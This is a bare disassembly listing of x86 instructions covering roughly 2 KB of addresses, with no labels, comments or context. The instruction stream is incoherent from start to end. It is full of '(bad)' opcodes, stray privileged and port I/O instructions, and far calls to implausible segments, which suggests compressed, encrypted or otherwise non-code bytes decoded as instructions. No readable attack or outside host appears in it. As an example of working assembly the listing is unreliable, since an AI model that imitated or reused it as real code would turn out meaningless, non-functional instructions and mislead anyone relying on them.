  409413:	mov    ebx,0xc1dabe4b
  409418:	cmp    al,0x51
  40941a:	mov    ebp,0xaed6e70a
  40941f:	sub    DWORD PTR [ecx],esi
  409421:	int    0xf7
  409423:	dec    edx
  409424:	punpckhdq mm2,QWORD PTR [ecx]
  409427:	out    dx,eax
  409428:	jbe    0x4093bd
  40942a:	mov    eax,ds:0x15953295
  40942f:	pop    ss
  409430:	sbb    edx,edx
  409432:	repz cmp ah,ah
  409435:	dec    eax
  409436:	xor    al,0x7f
  409438:	addr16 mov cl,ch
  40943b:	dec    ecx
  40943c:	mov    edi,0x2b079c14
  409441:	xchg   edi,eax
  409442:	ja     0x4093f7
  409444:	pop    es
  409445:	ret    
  409446:	push   es
  409447:	imul   ecx,DWORD PTR [ecx-0x1e2efe24],0x121335ee
  409451:	fist   WORD PTR [eax]
  409453:	xchg   ebx,eax
  409454:	test   DWORD PTR [edi+0x579a77b7],ecx
  40945a:	pusha  
  40945b:	sbb    DWORD PTR [ebx-0x741e3be4],edi
  409461:	push   ecx
  409462:	cwde   
  409463:	inc    ebp
  409464:	dec    edx
  409465:	adc    eax,0xfddcc276
  40946a:	aaa    
  40946b:	sub    edi,DWORD PTR [eax-0x63]
  40946e:	iret   
  40946f:	loop   0x409487
  409471:	test   al,0x30
  409473:	cld    
  409474:	xor    BYTE PTR [ebp-0xfe668f9],0x92
  40947b:	fsub   st(1),st
  40947d:	enter  0x5515,0xf7
  409481:	or     dh,BYTE PTR [edx]
  409483:	pop    eax
  409484:	les    eax,FWORD PTR [esi+0x75]
  409487:	std    
  409488:	and    DWORD PTR [edx-0x7790e74e],0xffffffd4
  40948f:	popa   
  409490:	repnz mov al,0x45
  409493:	cmc    
  409494:	lock test eax,0xc38c24b2
  40949a:	sub    esi,edi
  40949c:	dec    ecx
  40949d:	stos   DWORD PTR es:[edi],eax
  40949e:	mov    dl,0xa2
  4094a0:	fsub   st(3),st
  4094a2:	ss jl  0x40943d
  4094a5:	xor    DWORD PTR [edx-0x76],eax
  4094a8:	rcr    BYTE PTR [eax-0x52b4d6df],1
  4094ae:	lods   al,BYTE PTR ds:[esi]
  4094af:	lods   eax,DWORD PTR ds:[esi]
  4094b0:	aas    
  4094b1:	sub    ecx,0x4a
  4094b4:	and    edi,esi
  4094b6:	add    DWORD PTR [edi-0x577b70ab],eax
  4094bc:	lock push 0xd94085af
  4094c2:	les    edx,FWORD PTR [ecx-0x12602d79]
  4094c8:	xchg   ecx,eax
  4094c9:	pop    ss
  4094ca:	push   esi
  4094cb:	mov    edi,0xf360f7ea
  4094d0:	add    eax,edi
  4094d2:	dec    ebp
  4094d3:	into   
  4094d4:	mov    ds:0x402d1479,eax
  4094d9:	sar    DWORD PTR [eax+edx*2+0x28a252cd],1
  4094e0:	jmp    0x85bd:0xb1846b40
  4094e7:	pop    edi
  4094e8:	icebp  
  4094e9:	push   0xfaca46dc
  4094ee:	std    
  4094ef:	and    al,0x3f
  4094f1:	popf   
  4094f2:	cli    
  4094f3:	js     0x409526
  4094f5:	add    BYTE PTR [eax-0x1c],dl
  4094f8:	sbb    cl,bh
  4094fa:	and    ch,BYTE PTR ds:[edi+0x37]
  4094fe:	data16 int 0xad
  409501:	push   cs
  409502:	pop    edx
  409503:	into   
  409504:	pop    eax
  409505:	mov    eax,eax
  409507:	fiadd  WORD PTR [edi+0x48]
  40950a:	arpl   bx,di
  40950c:	ja     0x4094e9
  40950e:	frstorw [ebp+eax*1+0x28]
  409513:	out    0xdc,al
  409515:	arpl   WORD PTR [ebp-0x5f],bx
  409518:	sti    
  409519:	or     al,0x56
  40951b:	cmp    eax,0x3ffc5562
  409520:	fisubr WORD PTR [edx+0x7b7f1c22]
  409526:	and    DWORD PTR [ecx],esp
  409528:	push   esp
  409529:	inc    ebp
  40952a:	fs jo  0x409508
  40952d:	loopne 0x409583
  40952f:	(bad)  
  409530:	xchg   edx,eax
  409531:	out    0xaf,al
  409533:	adc    eax,0x121ab09b
  409538:	lea    edi,[ebx-0x6a]
  40953b:	push   esi
  40953d:	pop    ebx
  40953e:	inc    edi
  40953f:	mov    ah,0x5e
  409541:	packssdw mm3,QWORD PTR [edx+0x2affcb51]
  409548:	mov    ebx,0xcd32e627
  40954d:	mov    bh,0x45
  40954f:	mov    dh,0x64
  409551:	xchg   ebx,eax
  409552:	test   BYTE PTR [ebp+0x5b30f20a],ah
  409558:	in     eax,0xd
  40955a:	pop    ss
  40955b:	add    edx,ebx
  40955d:	clc    
  40955e:	mov    cl,0x25
  409560:	inc    esi
  409561:	call   0x4f8c:0x6027f394
  409568:	mov    ds:0x74a16308,eax
  40956d:	push   ds
  40956e:	enter  0x11d9,0xe5
  409572:	pop    esp
  409573:	pop    edx
  409574:	aaa    
  409575:	push   0x7d
  409577:	sub    eax,0x6e7065a9
  40957c:	retf   0x5973
  40957f:	add    BYTE PTR [edx+0x1b],dl
  409582:	pop    eax
  409583:	ds adc al,BYTE PTR gs:[ebp-0x9]
  409588:	pause  
  40958a:	int    0xef
  40958c:	mov    ch,0x2b
  40958e:	fdiv   QWORD PTR [edi-0x581baecf]
  409594:	jge    0x4095ef
  409596:	inc    edi
  409597:	xor    esp,DWORD PTR [ecx]
  409599:	push   ss
  40959a:	stc    
  40959b:	fdiv   QWORD PTR [eax+0x6d49f049]
  4095a1:	je     0x409574
  4095a3:	scas   al,BYTE PTR es:[edi]
  4095a4:	xchg   bh,cl
  4095a6:	mov    cl,0xfe
  4095a8:	test   eax,0x77907025
  4095ad:	or     dl,dh
  4095af:	pusha  
  4095b0:	sbb    bl,BYTE PTR [ecx+edx*8]
  4095b3:	in     eax,dx
  4095b4:	dec    esi
  4095b5:	hlt    
  4095b6:	xlat   BYTE PTR ds:[ebx]
  4095b7:	mov    ch,BYTE PTR [edx-0x2d869301]
  4095bd:	addr16 push ebp
  4095bf:	ret    
  4095c0:	pop    esi
  4095c1:	sub    esp,DWORD PTR [edi-0x2f6a262e]
  4095c7:	in     eax,dx
  4095c8:	xchg   DWORD PTR [ebx],esi
  4095ca:	and    DWORD PTR cs:[ecx-0x33d34077],eax
  4095d1:	cmp    DWORD PTR [eax+edx*1],ecx
  4095d4:	mov    bh,0x3c
  4095d6:	lahf   
  4095d7:	jl     0x409625
  4095d9:	dec    edi
  4095da:	fnsave [edi+0x14]
  4095dd:	bound  ebx,QWORD PTR [ecx-0x71184112]
  4095e3:	and    ch,ch
  4095e5:	mov    WORD PTR [edi+0x60edc074],es
  4095eb:	cmp    bl,0x6d
  4095ee:	je     0x409581
  4095f0:	das    
  4095f1:	sbb    dl,bh
  4095f3:	jno    0x4095d8
  4095f5:	aas    
  4095f6:	iret   
  4095f7:	cmc    
  4095f8:	(bad)  
  4095f9:	jno    0x40966b
  4095fb:	in     al,0xd
  4095fd:	jae    0x409585
  4095ff:	das    
  409600:	in     eax,dx
  409601:	adc    eax,0xedae241b
  409606:	pop    edi
  409607:	jbe    0x409669
  409609:	mov    BYTE PTR [ebx-0x47],dl
  40960c:	fst    DWORD PTR [esi-0x2e]
  40960f:	loope  0x409683
  409611:	mov    bh,0x57
  409613:	inc    ecx
  409614:	repnz aam 0x9c
  409617:	vpandn xmm7,xmm3,XMMWORD PTR [edx+0x51bed501]
  40961f:	mov    ds:0x7e0ecac,eax
  409624:	fbstp  TBYTE PTR [esi]
  409626:	xchg   ecx,eax
  409627:	scas   al,BYTE PTR es:[edi]
  409628:	or     eax,0xca5f8829
  40962d:	xchg   BYTE PTR [edi+0x60],bh
  409630:	test   DWORD PTR [edi],0xe88d7cf
  409636:	cli    
  409637:	aad    0x4d
  409639:	dec    eax
  40963a:	sbb    eax,0x6af322d1
  40963f:	pusha  
  409640:	mov    cx,0x2a2b
  409644:	scas   eax,DWORD PTR es:[edi]
  409645:	mov    ds:0xe624dfe0,al
  40964a:	push   ebx
  40964b:	jp     0x40962b
  40964d:	or     eax,0x6cd3896d
  409652:	pop    es
  409653:	jge    0x409679
  409655:	and    bl,BYTE PTR [ecx]
  409657:	clc    
  409658:	inc    ebp
  409659:	mov    al,0xa1
  40965b:	fbstp  TBYTE PTR [edx]
  40965d:	data16 dec BYTE PTR [ebp-0x6c]
  409661:	push   esi
  409662:	inc    ebx
  409663:	hlt    
  409664:	or     cl,BYTE PTR [edi+0x11]
  409667:	inc    edx
  409668:	into   
  409669:	and    esp,DWORD PTR [ecx-0x29bbb2c7]
  40966f:	(bad)  
  409670:	jge    0x4096ac
  409672:	lods   eax,DWORD PTR ds:[esi]
  409673:	xor    esp,DWORD PTR [eax+0x14]
  409676:	es dec esi
  409678:	jle    0x40967c
  40967a:	sbb    DWORD PTR [esi+0x2484779c],0xffffffe4
  409681:	mov    edi,0x76e0e359
  409686:	and    BYTE PTR [ebx],ah
  409688:	adc    ecx,DWORD PTR ds:0x39e2739c
  40968e:	cmp    bl,dl
  409690:	and    ah,bl
  409692:	stos   DWORD PTR es:[edi],eax
  409693:	or     BYTE PTR ds:[ebx-0xcf6d183],0x8a
  40969b:	cwde   
  40969c:	xchg   edx,eax
  40969d:	mov    ds:0xda35caef,al
  4096a2:	cld    
  4096a3:	lea    edi,[ecx+0x22bfef14]
  4096a9:	dec    edx
  4096aa:	push   es
  4096ab:	cmp    eax,0x37a34c1c
  4096b0:	adc    bh,bh
  4096b2:	pop    ebx
  4096b3:	cmc    
  4096b4:	(bad)  
  4096b6:	push   ds
  4096b7:	and    eax,0x70794fdd
  4096bc:	xor    ch,BYTE PTR [ebx+0x5856d1fc]
  4096c2:	daa    
  4096c3:	mov    cl,0x27
  4096c5:	add    al,0x34
  4096c7:	inc    edi
  4096c8:	call   0xc949:0xd8f42c9c
  4096cf:	jl     0x40974f
  4096d1:	mov    dh,0xd6
  4096d3:	inc    eax
  4096d4:	inc    eax
  4096d5:	aad    0xa1
  4096d7:	call   0x97f47797
  4096dc:	mov    al,ds:0x53302440
  4096e1:	fwait
  4096e2:	push   eax
  4096e3:	call   0x6ae9:0x6c3b6112
  4096ea:	pop    edx
  4096eb:	inc    edi
  4096ec:	aaa    
  4096ed:	cld    
  4096ee:	cs in  eax,0x1a
  4096f1:	in     eax,0xc
  4096f3:	(bad)  
  4096f4:	and    BYTE PTR [ebx],bl
  4096f6:	xchg   ebp,eax
  4096f7:	mov    ds:0x8c63f962,al
  4096fc:	ret    
  4096fd:	cmp    eax,0xaf42a0ab
  409702:	dec    esi
  409703:	pusha  
  409704:	jmp    0x409690
  409706:	sbb    eax,0x9c2ded41
  40970b:	mov    dl,0x17
  40970d:	retf   0xc8f8
  409710:	ds inc esp
  409712:	es cdq 
  409714:	or     DWORD PTR [ebx+0x67605e86],0x62
  40971b:	mov    eax,0x7c69b2de
  409720:	inc    edi
  409721:	sbb    cl,BYTE PTR [ecx+ebx*4-0xc]
  409725:	mov    eax,ebp
  409727:	les    esi,FWORD PTR [esi+0x52]
  40972a:	pop    ss
  40972b:	push   edx
  40972c:	pop    ebx
  40972d:	push   eax
  40972e:	sbb    al,0x81
  409730:	sub    al,0x2d
  409732:	loopne 0x4096e4
  409734:	mov    esi,0x22afab75
  409739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40973a:	sar    DWORD PTR [ebx],1
  40973c:	(bad)  
  40973e:	jae    0x40977b
  409740:	jns    0x4096d0
  409742:	shl    ebp,0x24
  409745:	cwde   
  409746:	cmp    ah,BYTE PTR [ebp-0xd7c94ab]
  40974c:	ins    BYTE PTR es:[edi],dx
  40974d:	out    dx,eax
  40974e:	cmp    al,0x2b
  409750:	(bad)  [edx-0x67]
  409753:	xchg   DWORD PTR [ebp+0x2650c7ec],ecx
  409759:	test   eax,0x6c729487
  40975e:	lea    ebx,[eax+0x2b4f3632]
  409764:	dec    esp
  409765:	xchg   ebx,eax
  409766:	dec    ecx
  409767:	mov    ?,esp
  409769:	dec    esp
  40976a:	rol    DWORD PTR ds:0x236c388e,cl
  409770:	jl     0x40979e
  409772:	cmp    al,dl
  409774:	and    ch,BYTE PTR [edx]
  409776:	pop    edi
  409777:	mov    bh,0xca
  409779:	je     0x4097b1
  40977b:	jge    0x40978e
  40977d:	adc    DWORD PTR [ecx-0x35],edi
  409780:	pop    edx
  409781:	jp     0x40977a
  409783:	(bad)  [edi]
  409785:	cs in  al,dx
  409787:	test   BYTE PTR [ebp+0x24],ah
  40978a:	xchg   ebx,eax
  40978b:	push   ebp
  40978c:	mov    eax,ds:0x54b60ce
  409791:	aad    0xdf
  409793:	inc    edx
  409794:	out    0x1c,eax
  409796:	and    cl,BYTE PTR [edx-0x30]
  409799:	jl     0x409733
  40979b:	js     0x409763
  40979d:	dec    eax
  40979e:	mov    ecx,DWORD PTR [ecx+edx*2-0x60]
  4097a2:	mov    BYTE PTR [edx+0x79],bh
  4097a5:	mov    eax,0x6fa09ab8
  4097aa:	mov    cl,0x38
  4097ac:	dec    edi
  4097ad:	sbb    esp,DWORD PTR [edx]
  4097af:	xchg   eax,esi
  4097b1:	pusha  
  4097b2:	xchg   esp,eax
  4097b3:	ja     0x409768
  4097b5:	(bad)  [eax]
  4097b7:	sbb    BYTE PTR [ecx],cl
  4097b9:	test   al,0x3d
  4097bb:	dec    edi
  4097bc:	(bad)  
  4097be:	(bad)  
  4097bf:	leave  
  4097c0:	data16 jb 0x40981b
  4097c3:	xchg   ebx,eax
  4097c4:	call   0x977d:0x3966b92
  4097cb:	mov    eax,0xb21a37d3
  4097d0:	test   DWORD PTR [edx-0x5d],edi
  4097d3:	frstor [edx+0x5c]
  4097d6:	push   0xffffffc6
  4097d8:	cwde   
  4097d9:	and    dh,cl
  4097db:	dec    ebp
  4097dc:	rcr    DWORD PTR [ecx-0x4c],1
  4097df:	and    dh,cl
  4097e1:	test   al,0x7e
  4097e3:	inc    ecx
  4097e4:	push   ebp
  4097e5:	cwde   
  4097e6:	mov    esp,ss
  4097e8:	push   ebx
  4097e9:	adc    DWORD PTR [edx+esi*2],esi
  4097ec:	dec    edi
  4097ed:	pusha  
  4097ee:	add    bl,dl
  4097f0:	(bad)  
  4097f1:	jno    0x4097bc
  4097f3:	push   cs
  4097f4:	or     al,0xa9
  4097f6:	les    esp,FWORD PTR [ebx+0x4c]
  4097f9:	fld    TBYTE PTR [ebp+0x14]
  4097fc:	ss sbb eax,0x3e1b3c36
  409802:	mov    ds,WORD PTR [ecx-0x17]
  409805:	or     al,0x81
  409807:	mov    esi,0xb61d702e
  40980c:	lock clc 
  40980e:	pop    ebx
  40980f:	xor    cl,dh
  409811:	pusha  
  409812:	test   eax,0x3628733b
  409817:	lock adc al,0x8c
  40981a:	add    ecx,DWORD PTR [ebp+0x67]
  40981d:	inc    esp
  40981e:	adc    BYTE PTR [ebp+0x618e1221],0x43
  409825:	icebp  
  409826:	jge    0x40983c
  409828:	or     eax,0x6daf1703
  40982d:	ret    
  40982e:	das    
  40982f:	push   ss
  409830:	pusha  
  409831:	lea    ecx,[eax+0x11]
  409834:	inc    esi
  409835:	xchg   edx,eax
  409836:	sub    edi,DWORD PTR [edx]
  409838:	push   cs
  409839:	and    esi,DWORD PTR [eax]
  40983b:	int    0x14
  40983d:	ss jle 0x4097fa
  409840:	xchg   esi,eax
  409841:	jo     0x409825
  409843:	sbb    DWORD PTR [ebx-0x18],edx
  409846:	int3   
  409847:	xor    DWORD PTR [ebx-0x4b],edi
  40984a:	sbb    esp,DWORD PTR [eax+0x6]
  40984d:	lods   al,BYTE PTR ds:[esi]
  40984e:	add    dl,dh
  409850:	jl     0x40988c
  409852:	cmp    DWORD PTR [ecx-0x444b17c3],esp
  409858:	jne    0x40989d
  40985a:	jmp    0x418d600b
  40985f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409860:	arpl   WORD PTR [edi+0x7f],ax
  409863:	cmp    edi,DWORD PTR [esi-0x1]
  409866:	std    
  409867:	cmp    ch,bh
  409869:	dec    ebp
  40986a:	mov    dh,0x8c
  40986c:	xchg   esp,eax
  40986d:	and    al,0x90
  40986f:	mov    eax,eax
  409871:	out    dx,eax
  409872:	cmp    eax,0x6d3536e8
  409877:	iret   
  409878:	ret    
  409879:	(bad)  
  40987a:	ficom  WORD PTR [edi]
  40987c:	dec    esi
  40987d:	push   0x6d
  40987f:	in     al,dx
  409880:	cdq    
  409881:	jecxz  0x40985e
  409883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409884:	lock mov esi,0x34762648
  40988a:	cmp    ebx,DWORD PTR [ebx-0x13]
  40988d:	jge    0x40989f
  40988f:	push   0xb237c378
  409894:	jnp    0x40989c
  409896:	and    al,0x88
  409898:	popa   
  409899:	cmovnp ebp,DWORD PTR [ecx-0x54819f83]
  4098a0:	sbb    DWORD PTR [eax-0x5],edi
  4098a3:	mov    esp,fs
  4098a5:	stos   DWORD PTR es:[edi],eax
  4098a6:	pop    edi
  4098a7:	ins    BYTE PTR es:[edi],dx
  4098a8:	mov    ecx,0x11b61d94
  4098ad:	push   edx
  4098ae:	test   DWORD PTR [ecx-0x16ef0234],eax
  4098b4:	inc    eax
  4098b5:	and    BYTE PTR [ecx+0x5703fc44],bl
  4098bb:	push   ebp
  4098bc:	mov    ebp,ebx
  4098be:	sub    eax,0x6a95efed
  4098c3:	je     0x40989f
  4098c5:	leave  
  4098c6:	out    0xcc,eax
  4098c8:	call   0xb0:0x35b7be10
  4098cf:	pop    esi
  4098d0:	fistp  WORD PTR [edx-0x2b]
  4098d3:	out    dx,al
  4098d4:	les    edi,FWORD PTR [esi-0x1f39ac90]
  4098da:	retf   0xf74
  4098dd:	mov    bh,0xcb
  4098df:	cmp    eax,0x44d44fc1
  4098e4:	xchg   esi,eax
  4098e5:	xor    dl,BYTE PTR [ebx+0x651aba36]
  4098eb:	push   ecx
  4098ec:	or     al,0x15
  4098ee:	adc    bh,ah
  4098f0:	sbb    DWORD PTR [ebx+ebx*2],esp
  4098f3:	int3   
  4098f4:	ds cmp al,0xa1
  4098f7:	xor    BYTE PTR [edx+0x6e],ah
  4098fa:	int    0x8d
  4098fc:	clc    
  4098fd:	fiadd  DWORD PTR [edx+0x10bbd124]
  409903:	fimul  DWORD PTR [ebx-0x524c243d]
  409909:	sbb    ebx,DWORD PTR [eax+0x2410f0ab]
  40990f:	pop    ss
  409910:	out    dx,al
  409911:	push   eax
  409912:	fldenv [ecx]
  409914:	inc    eax
  409915:	jmp    0x409908
  409917:	mov    dh,0x1c
  409919:	push   ss
  40991a:	test   al,0x6e
  40991c:	jp     0x409969
  40991e:	mov    esp,0x43971a88
  409923:	mov    esi,0xa64afae3
  409928:	push   ds
  409929:	pop    ebp
  40992a:	or     DWORD PTR [eax+0x4acbaacc],esp
  409930:	(bad)  
  409931:	push   0x0
  409933:	leave  
  409934:	adc    edi,edx
  409936:	push   esi
  409937:	jp     0x40991f
  409939:	icebp  
  40993a:	jne    0x409995
  40993c:	ficom  WORD PTR [ebx+0x29421ab4]
  409942:	mul    DWORD PTR [ebx]
  409944:	push   ss
  409945:	mov    al,0x94
  409947:	sbb    edi,DWORD PTR [edi]
  409949:	into   
  40994a:	in     eax,dx
  40994b:	mov    ebx,0xd2606789
  409950:	mov    eax,ds:0xc1ff2418
  409955:	fs pop ecx
  409957:	inc    eax
  409958:	daa    
  409959:	popa   
  40995a:	in     al,dx
  40995b:	dec    esi
  40995c:	test   eax,0x87b8155d
  409961:	rcr    DWORD PTR [ebx+0x1d528f18],0x10
  409968:	rcr    DWORD PTR [ebx+eax*8-0x6280513e],cl
  40996f:	bound  esp,QWORD PTR [edx+0x52]
  409972:	out    dx,al
  409973:	mov    esi,0xa52592ac
  409978:	jno    0x409985
  40997a:	(bad)  
  40997b:	sub    ah,cl
  40997d:	mov    esp,0x404664c1
  409982:	in     eax,0xd1
  409984:	rcl    DWORD PTR [ebx+0x73],1
  409987:	jmp    0xfcd8db60
  40998c:	daa    
  40998d:	push   esp
  40998e:	push   ebx
  40998f:	out    0x32,al
  409991:	xchg   ecx,eax
  409992:	sub    esi,ecx
  409994:	inc    edi
  409995:	es or  ebp,esp
  409998:	fsub   st,st(5)
  40999a:	xchg   ebp,eax
  40999b:	push   eax
  40999c:	push   0x5305d843
  4099a1:	sbb    ah,BYTE PTR [esi-0xe]
  4099a4:	or     al,0x10
  4099a6:	adc    eax,0xff3b57b2
  4099ab:	scas   ax,WORD PTR es:[edi]
  4099ad:	or     ecx,DWORD PTR cs:[ebx-0x66c43e67]
  4099b4:	mov    cl,BYTE PTR [edx]
  4099b6:	and    BYTE PTR [esi+0x7b],ah
  4099b9:	pushf  
  4099ba:	or     eax,0x1357b1b
  4099bf:	scas   al,BYTE PTR es:[edi]
  4099c0:	(bad)  
  4099c1:	(bad)  
  4099c2:	sbb    al,0x78
  4099c4:	sbb    bl,ch
  4099c6:	mov    al,0xf
  4099c8:	es cdq 
  4099ca:	scas   al,BYTE PTR es:[edi]
  4099cb:	shl    BYTE PTR [ebp-0x42e8d2f4],cl
  4099d1:	loopne 0x4099e8
  4099d3:	mov    dl,0xc5
  4099d5:	scas   eax,DWORD PTR es:[edi]
  4099d6:	jle    0x409980
  4099d8:	jbe    0x4099ea
  4099da:	aaa    
  4099db:	shl    DWORD PTR [edx+0x7f1cc8e2],1
  4099e1:	cmc    
  4099e2:	sbb    dh,BYTE PTR [esi+edi*1]
  4099e5:	loop   0x409a21
  4099e7:	sti    
  4099e8:	push   ebx
  4099e9:	sar    bh,cl
  4099eb:	push   ebx
  4099ec:	adc    BYTE PTR [ebx+0x5e456247],al
  4099f2:	add    ah,BYTE PTR [ebx+0x76958011]
  4099f8:	add    al,0xae
  4099fa:	bound  esi,QWORD PTR ds:0xdb29c00f
  409a00:	sbb    al,0xf4
  409a02:	stos   BYTE PTR es:[edi],al
  409a03:	cmp    esi,DWORD PTR [esi+ebp*2]
  409a06:	and    eax,0x69ddd3d8
  409a0b:	mov    ah,0x38
  409a0d:	pop    ebp
  409a0e:	dec    ebp
  409a0f:	mov    dh,0xdf
  409a11:	outs   dx,DWORD PTR ds:[esi]
  409a12:	cmp    BYTE PTR [edx+0xb0edde],dl
  409a18:	pushf  
  409a19:	jmp    FWORD PTR [edi]
  409a1b:	mov    eax,ds:0x925ede56
  409a21:	cmp    cl,BYTE PTR [edi]
  409a23:	call   0x8d80:0xc6d6819d
  409a2a:	jae    0x409a1f
  409a2c:	pusha  
  409a2d:	adc    ebx,DWORD PTR [ebx+0x2e]
  409a30:	xlat   BYTE PTR ds:[ebx]
  409a31:	mov    ds:0x5322f8bb,al
  409a36:	pop    ecx
  409a37:	adc    DWORD PTR [ecx+0x66],ecx
  409a3a:	rcr    DWORD PTR [esi-0x3c],1
  409a3d:	fsubr  QWORD PTR [edi+edi*1]
  409a40:	adc    BYTE PTR [edx-0xb],bh
  409a43:	cmp    edx,DWORD PTR [eax+esi*8+0x0]
  409a47:	pop    ds
  409a48:	mov    ebp,0xabc97f04
  409a4d:	cmp    al,0xea
  409a4f:	in     al,dx
  409a50:	daa    
  409a51:	inc    ebx
  409a52:	js     0x409a28
  409a54:	dec    esp
  409a55:	ins    BYTE PTR es:[edi],dx
  409a56:	add    al,0xd
  409a58:	retf   
  409a59:	mov    bh,0xe7
  409a5b:	or     dh,BYTE PTR [ebx+0x78]
  409a5e:	lahf   
  409a5f:	sub    eax,0x3725a090
  409a64:	cmp    eax,edx
  409a66:	aad    0x34
  409a68:	sub    ah,ah
  409a6a:	lds    ebx,FWORD PTR [ecx+0x65]
  409a6d:	cmp    al,0x1e
  409a6f:	mov    ch,0x1f
  409a71:	sbb    al,0x63
  409a73:	sbb    BYTE PTR [ebp+0x30a23861],0x1b
  409a7a:	test   DWORD PTR [eax],ebx
  409a7c:	inc    edx
  409a7d:	test   BYTE PTR [eax+0x76],dl
  409a80:	div    BYTE PTR [ecx]
  409a82:	in     al,dx
  409a83:	jb     0x409a47
  409a85:	push   es
  409a86:	jno    0x409a61
  409a88:	out    0x86,al
  409a8a:	add    bl,bl
  409a8c:	(bad)
  409a8f:	imul   esi,DWORD PTR [edi-0x50],0x8132bd59
  409a96:	or     BYTE PTR [edx+0x55],0x76
  409a9a:	cwde   
  409a9b:	pop    ebx
  409a9c:	xor    edx,edi
  409a9e:	icebp  
  409a9f:	jb     0x409b18
  409aa1:	or     BYTE PTR gs:[edx+0x366bd66e],0x46
  409aa9:	or     ebp,DWORD PTR [eax]
  409aab:	inc    edx
  409aac:	adc    al,0x6c
  409aae:	xchg   esp,eax
  409aaf:	outs   dx,BYTE PTR ds:[esi]
  409ab0:	mov    DWORD PTR [edx+edi*4+0x8835ef4],edi
  409ab7:	mov    DWORD PTR [ebx+0x7d],edi
  409aba:	xlat   BYTE PTR ds:[ebx]
  409abb:	sbb    edi,DWORD PTR ss:[edx+0x72]
  409abf:	je     0x409a61
  409ac1:	iret   
  409ac2:	jle    0x409a54
  409ac4:	es push esp
  409ac6:	test   al,0xb2
  409ac8:	xor    ecx,DWORD PTR [edi-0xe]
  409acb:	pop    es
  409acc:	add    cl,BYTE PTR [edx]
  409ace:	push   edx
  409acf:	jl     0x409b3f
  409ad1:	xchg   ebx,eax
  409ad2:	push   ebx
  409ad3:	icebp  
  409ad4:	push   esi
  409ad5:	pop    ss
  409ad6:	push   si
  409ad8:	xchg   edi,eax
  409ad9:	cmp    al,0x41
  409adb:	push   esi
  409adc:	pushf  
  409add:	mul    DWORD PTR [edx+0x57c6011f]
  409ae3:	push   ss
  409ae4:	jp     0x409b23
  409ae6:	repz push es
  409ae8:	test   eax,0x81ae6dd7
  409aed:	das    
  409aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aef:	popf   
  409af0:	ins    BYTE PTR es:[edi],dx
  409af1:	pop    edx
  409af2:	jp     0x409af7
  409af4:	inc    ebx
  409af5:	pop    ebx
  409af6:	ret    
  409af7:	fstp   QWORD PTR [eax-0x7f]
  409afa:	pop    ss
  409afb:	das    
  409afc:	stc    
  409afd:	mov    bh,0xa5
  409aff:	pop    edx
  409b00:	sbb    BYTE PTR [eax+0x5c],0xdd
  409b04:	mov    BYTE PTR [edi+0x0],al
  409b07:	iret   
  409b08:	cmp    DWORD PTR [ecx*8+0x7b243c0a],esi
  409b0f:	xlat   BYTE PTR ds:[ebx]
  409b10:	jle    0x409b35
  409b12:	out    dx,al
  409b13:	daa    
  409b14:	je     0x409b7a
  409b16:	ret    
  409b17:	xlat   BYTE PTR ds:[ebx]
  409b18:	stc    
  409b19:	pop    eax
  409b1a:	or     ebx,0xffffff80
  409b1d:	das    
  409b1e:	ins    DWORD PTR es:[edi],dx
  409b1f:	sub    BYTE PTR [edx+0x17],dh
  409b22:	inc    eax
  409b23:	test   BYTE PTR [ebx+ebx*8+0x6d5fb8f4],al
  409b2a:	pop    eax
  409b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b2c:	sbb    ecx,DWORD PTR [ebx+0x6f]
  409b2f:	dec    edx
  409b30:	inc    ebp
  409b31:	rcl    DWORD PTR [ebp+0xa],1
  409b34:	xchg   ebx,eax
  409b35:	cmp    eax,0xb0062760
  409b3a:	inc    ebp
  409b3b:	xor    DWORD PTR [edi+ebp*2],ebx
  409b3e:	add    bh,BYTE PTR [esi+0x6fc98a2b]
  409b44:	and    BYTE PTR [ebx],0x5f
  409b47:	or     esp,DWORD PTR [edx-0x4ae2f195]
  409b4d:	jbe    0x409ba7
  409b4f:	in     ax,dx
  409b51:	into   
  409b52:	in     al,0x77
  409b54:	xchg   ebx,eax
  409b55:	mov    al,ds:0xf25803db
  409b5a:	in     al,dx
  409b5b:	cmp    ebx,DWORD PTR [eax-0x22ca2b2e]
  409b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b62:	and    DWORD PTR ds:0x197dc,edi
  409b68:	pop    ebp
  409b69:	inc    eax
  409b6a:	aad    0xb2
  409b6c:	add    DWORD PTR [eax],0xffffffaf
  409b6f:	neg    BYTE PTR [ecx-0x65]
  409b72:	fs (bad) 
  409b74:	ss repnz dec esp
  409b77:	inc    ecx
  409b78:	rol    BYTE PTR [eax+0x698d1439],0x8b
  409b7f:	mov    edi,0x6f9a0af5
  409b84:	out    0x99,eax
  409b86:	fnsave [esi+0x1352d532]
  409b8c:	xchg   edi,eax
  409b8d:	mov    edi,0x89326914
  409b92:	loopne 0x409b38
  409b94:	jecxz  0x409be8
  409b96:	fwait
  409b97:	or     dl,BYTE PTR [ebx+0x7f]
  409b9a:	cmp    ebx,DWORD PTR [esi-0x759f484f]
  409ba0:	adc    esp,DWORD PTR [edx]
  409ba2:	aaa    
  409ba3:	push   edx
  409ba5:	push   ebx
  409ba6:	rcl    DWORD PTR [edx+0x307a16b6],cl
  409bac:	out    0xec,eax
  409bae:	or     dh,BYTE PTR [ebx+0x4b1478d3]
  409bb4:	push   cs
  409bb5:	or     BYTE PTR [ecx],ah
  409bb7:	push   cs
  409bb8:	jmp    0x409c2c
  409bba:	adc    al,0x3b
  409bbc:	add    ch,BYTE PTR [ebx]
  409bbe:	mov    ecx,0xcc403c1
  409bc3:	xor    eax,0x6164c0d5
  409bc8:	imul   edx,DWORD PTR [ebp+0x3b],0xffffffec
  409bcc:	xchg   edi,eax
  409bcd:	repnz scas eax,DWORD PTR es:[edi]
  409bcf:	mov    BYTE PTR ds:[esi-0x55b5bf07],cl
  409bd6:	jge    0x409bac
  409bd8:	cmp    eax,ebp
  409bda:	inc    esi
  409bdb:	ins    BYTE PTR es:[edi],dx
  409bdc:	push   ds
  409bdd:	mov    ecx,DWORD PTR [ecx]
  409bdf:	fisubr DWORD PTR [esi-0x3eec53e1]
  409be5:	push   cs
  409be6:	add    ebx,DWORD PTR [eax+edi*1]
  409be9:	into   
  409bea:	retf   0x614
  409bed:	test   al,0x23
  409bef:	dec    esi
